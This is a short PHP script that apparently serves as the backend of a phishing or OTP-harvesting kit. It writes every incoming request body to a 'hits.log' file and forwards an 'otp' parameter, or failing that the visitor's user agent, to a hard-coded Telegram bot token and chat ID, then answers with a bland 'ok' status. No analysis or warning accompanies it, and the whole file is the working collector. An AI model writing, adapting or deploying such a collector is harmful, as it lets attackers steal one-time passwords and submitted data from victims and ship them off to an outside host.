<?php
header('Content-Type: application/json');
$log = date('Y-m-d H:i:s').' | '.file_get_contents('php://input')."\n";
file_put_contents('hits.log', $log, FILE_APPEND);

$token = '8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q';
$chat_id = '1705240737';
$url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=".urlencode($_GET['otp'] ?? $_SERVER['HTTP_USER_AGENT']);
file_get_contents($url);

echo json_encode(['status'=>'ok']);
?>
